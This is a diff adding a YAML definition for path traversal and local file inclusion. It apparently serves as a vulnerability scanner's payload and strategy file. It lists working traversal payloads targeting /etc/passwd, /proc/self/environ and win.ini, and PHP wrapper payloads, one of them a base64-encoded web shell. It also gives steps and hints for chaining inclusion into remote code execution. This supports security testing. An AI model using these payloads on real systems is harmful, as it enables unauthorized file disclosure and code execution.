@@ -1,0 +1,53 @@
+id: PATH_TRAVERSAL
+name: Path Traversal / Local File Inclusion
+cwe:
+- CWE-22
+- CWE-98
+owasp: A01:2021 Broken Access Control
+severity_range: High - Critical
+description: Application uses user input in file paths without proper validation, allowing reading arbitrary files or including
+  malicious files.
+detection:
+  payloads:
+    unix:
+    - ../../../etc/passwd
+    - '....//....//....//etc/passwd'
+    - ..%2f..%2f..%2fetc%2fpasswd
+    - '%2e%2e/%2e%2e/%2e%2e/etc/passwd'
+    - ..%252f..%252f..%252fetc%252fpasswd
+    - /etc/passwd
+    - '....\....\....\etc\passwd'
+    - ..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
+    - /proc/self/environ
+    - /proc/self/cmdline
+    windows:
+    - ..\..\..\windows\win.ini
+    - '....\\....\\....\\windows\\win.ini'
+    - ..%5c..%5c..%5cwindows%5cwin.ini
+    - C:\windows\win.ini
+    - C:/windows/win.ini
+    null_byte:
+    - ../../../etc/passwd%00
+    - ../../../etc/passwd%00.png
+    wrapper:
+    - php://filter/convert.base64-encode/resource=index.php
+    - php://input
+    - data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
+    - expect://id
+  strategy:
+  - 1. Identify parameters that reference files (file=, path=, page=, template=, doc=, img=)
+  - 2. Test with ../../../etc/passwd (Linux) or ..\..\..\windows\win.ini (Windows)
+  - 3. Try URL encoding, double encoding, and Unicode normalization bypasses
+  - 4. Test null byte truncation (%00) for older runtimes
+  - 5. Test PHP wrappers if PHP detected (php://filter, php://input)
+  - 6. Check file upload + LFI combination for RCE
+  - 7. Test log file inclusion for RCE via access logs
+evidence_needed: Contents of a known file (e.g., root:x:0:0 from /etc/passwd) in response
+ai_research_hints:
+- Check if LFI can be chained with log poisoning for RCE
+- Test /proc/self/environ for environment variable leakage
+- Look for file download endpoints with path parameters
+- Test ZIP file extraction features for ZipSlip (path traversal in archive)
+references:
+- https://portswigger.net/web-security/file-path-traversal
+- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal
